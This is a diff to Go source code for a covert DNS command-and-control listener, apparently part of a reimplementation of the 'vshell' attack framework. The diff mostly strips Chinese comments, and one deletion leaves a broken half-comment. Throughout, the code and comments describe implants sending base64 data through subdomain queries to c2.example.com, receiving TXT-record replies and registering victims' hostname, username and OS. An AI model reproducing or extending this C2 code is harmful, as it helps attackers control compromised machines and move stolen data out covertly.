@@ -1,4 +1,3 @@
-// Package c2engine/dns 实现基于 DNS 查询的隐蔽 C2 信道。
 // Package c2engine/dns implements a covert DNS-based C2 channel.
 package c2engine
 
@@ -26,8 +25,6 @@ import (
 // The server responds with encoded data in TXT records.
 // 原版 vshell 支持 DNS 作为 C2 传输模式：Agent 将数据编码进 DNS 子域查询
 // （<base64_data>.<agent_id>.c2.example.com），服务器以 TXT 记录返回编码数据。
-
-// DNSListener 实现隐蔽 DNS C2 信道。
 // DNSListener implements a covert DNS C2 channel.
 type DNSListener struct {
 	mu          sync.RWMutex
@@ -44,8 +41,6 @@ type DNSListener struct {
 	pendingOut map[string][]string
 	pendingMu  sync.RWMutex
 }
-
-// NewDNSListener 创建新的 DNS C2 监听器。
 // NewDNSListener creates a new DNS C2 listener.
 func NewDNSListener(id int64, domain, publicDNS, verifyKey string, maxSize int) *DNSListener {
 	if maxSize <= 0 {
@@ -61,8 +56,6 @@ func NewDNSListener(id int64, domain, publicDNS, verifyKey string, maxSize int) 
 		stopCh:     make(chan struct{}),
 	}
 }
-
-// Start 开始监听 DNS 查询。
 // Start begins listening for DNS queries.
 func (dl *DNSListener) Start() error {
 	dl.mu.Lock()
@@ -198,8 +191,6 @@ func (dl *DNSListener) processMessage(agentID, data, remoteAddr string) string {
 		if len(parts) > 2 {
 			osName = parts[2]
 		}
-
-		// DNS 注册载荷是 "hostname|username|osname" 三段，不带架构字段（原版
 		// DNS 通道的注册串同样只到这里），因此 Arch 留空。
 		client, err := engine.NewClient(
 			dl.VerifyKey,
@@ -305,8 +296,6 @@ func splitDNSChunks(s string, chunkSize int) []string {
 	}
 	return chunks
 }
-
-// Stop 优雅停止 DNS 监听器。
 // Stop gracefully stops the DNS listener.
 func (dl *DNSListener) Stop() error {
 	dl.mu.Lock()
@@ -324,8 +313,6 @@ func (dl *DNSListener) Stop() error {
 	log.Printf("[DNS Listener %d] Stopped", dl.ID)
 	return nil
 }
-
-// IsRunning 返回监听器是否活跃。
 // IsRunning returns whether the listener is active.
 func (dl *DNSListener) IsRunning() bool {
 	dl.mu.RLock()
